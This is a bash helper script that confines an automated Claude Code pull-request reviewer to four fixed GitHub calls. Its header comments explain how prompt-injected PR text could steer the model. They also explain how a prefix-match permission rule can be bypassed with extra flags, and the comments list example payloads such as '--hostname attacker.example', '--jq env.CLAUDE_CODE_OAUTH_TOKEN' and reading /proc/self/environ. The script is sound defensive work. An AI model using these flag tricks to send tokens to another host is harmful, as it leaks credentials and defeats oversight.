#!/usr/bin/env bash
# The only GitHub access the automated PR reviewer is allowed to make.
#
# .github/workflows/claude-code-review.yml runs a Claude Code reviewer over
# PR-authored text — the diff, commit messages, existing comments. Anything that
# text can talk the model into doing, the model can do. So the reviewer holds no
# `gh` grant of its own: every GitHub call it makes comes through here, and this
# script takes the DESTINATION (host, repo, pull request, commit) from its
# environment and only the CONTENT from its arguments. The model controls the
# arguments and nothing else, so it cannot choose where anything goes.
#
# Why a fixed-shape helper and not a narrower allow-list pattern: Claude Code's
# Bash matcher is a prefix match. It refuses chaining, substitution, pipes and
# redirection, but it permits extra flags on the same invocation — so no pattern
# short of an exact match can forbid a trailing `--repo attacker.example/a/b`,
# `--hostname attacker.example`, `-H "Authorization: Bearer $GH_TOKEN"` or
# `--jq 'env.CLAUDE_CODE_OAUTH_TOKEN'`. And because the shell expands `$VAR`, the
# model never even has to READ a secret to send one. Removing the choice beats
# pattern-matching it away. Measured, all three, against the real API:
#   gh pr diff 1 --repo HOST/OWNER/REPO      connects to HOST (any host)
#   gh pr view N --repo R --jq 'env.SECRET'  prints the process environment
#   gh api --hostname HOST -H "..."          posts cross-host with the token
#
# Usage — the reviewer prompt in the workflow spells these out too:
#   review-gh.sh diff                          print the pull request's diff
#   review-gh.sh view <jsonFields>             print PR metadata as JSON
#   review-gh.sh summary <body>                 post the top-level summary comment
#   review-gh.sh inline <path> <line> <body>    post one line-level review comment
#
# Environment, set by the workflow and out of the model's reach:
#   REVIEW_REPO  OWNER/REPO, no host prefix (validated below)
#   REVIEW_PR    the pull request number (validated below)
#   GH_TOKEN     supplied to the reviewer's shell by claude-code-action
#
# Run this from a copy materialized out of the repository's DEFAULT BRANCH, never
# from the PR checkout — see the workflow step "Materialize the trusted review
# helper". A helper the PR can rewrite is not a helper: the attacker just
# rewrites it. Its fixture suite is scripts/test-review-classifier.sh.

set -uo pipefail

# Pin the host. The model cannot reach this variable, and no call below passes a
# host-prefixed `--repo`, which is the one thing that would override it.
export GH_HOST=github.com

die() {
  echo "review-gh: $1" >&2
  exit 2
}

repo=${REVIEW_REPO:-}
pr=${REVIEW_PR:-}

# Exactly one slash. `HOST/OWNER/REPO` is how a `--repo` value smuggles in another
# host, so anything with a second slash is refused rather than handed to `gh`.
case "$repo" in
  -* | */*/*) die "REVIEW_REPO must be OWNER/REPO with no host prefix; got '$repo'" ;;
  ?*/?*) ;;
  *) die "REVIEW_REPO must be OWNER/REPO; got '$repo'" ;;
esac

case "$pr" in
  '' | *[!0-9]*) die "REVIEW_PR must be a pull request number; got '$pr'" ;;
esac

sub=${1:-}
[ "$#" -gt 0 ] && shift

case "$sub" in
  diff)
    [ "$#" -eq 0 ] || die "diff takes no arguments (got $#)"
    exec gh pr diff "$pr" --repo "$repo"
    ;;

  view)
    [ "$#" -eq 1 ] || die "view takes one argument, a comma-separated list of JSON field names (got $#)"
    # Field names only, which is what keeps `--jq` out of reach: `gh`'s jq
    # expressions can read the process environment, so `--jq 'env.GH_TOKEN'` is
    # the same secret-read primitive as `grep "" /proc/self/environ`. The reviewer
    # gets raw JSON and filters it itself.
    case "$1" in
      '' | *[!A-Za-z,]*) die "view fields must be comma-separated JSON field names; got '$1'" ;;
    esac
    exec gh pr view "$pr" --repo "$repo" --json "$1"
    ;;

  summary)
    [ "$#" -eq 1 ] || die "summary takes one argument, the comment body (got $#)"
    [ -n "$1" ] || die "summary body must not be empty"
    exec gh pr comment "$pr" --repo "$repo" --body "$1"
    ;;

  inline)
    [ "$#" -eq 3 ] || die "inline takes three arguments: <path> <line> <body> (got $#)"
    path=$1
    line=$2
    body=$3
    [ -n "$path" ] || die "inline path must not be empty"
    [ -n "$body" ] || die "inline body must not be empty"
    case "$line" in
      '' | *[!0-9]*) die "inline line must be a whole number; got '$line'" ;;
    esac
    [ "$line" -gt 0 ] || die "inline line must be greater than zero; got '$line'"

    # Resolved here rather than passed in: the commit is part of the destination,
    # and it is the one field of this call the reviewer has no business choosing.
    # The `--jq` here is a literal in this file, not model input.
    sha=$(gh pr view "$pr" --repo "$repo" --json headRefOid --jq '.headRefOid') ||
      die "could not resolve the head commit of $repo#$pr"
    case "$sha" in
      '' | *[!0-9a-f]*) die "unexpected head commit '$sha'" ;;
    esac

    # `-f` (raw-field), never `-F`, for anything the model supplies: `-F` reads
    # `key=@path` from a FILE, so a body or path beginning with `@` would turn
    # into an arbitrary file read. `-f` takes the value literally — verified
    # against the API. `line` is the one `-F`, because the endpoint wants a
    # number and the check above has already proved it is digits.
    exec gh api --method POST "repos/$repo/pulls/$pr/comments" \
      -f "body=$body" \
      -f "commit_id=$sha" \
      -f "path=$path" \
      -F "line=$line" \
      -f side=RIGHT
    ;;

  *) die "unknown subcommand '$sub'; expected diff, view, summary or inline" ;;
esac
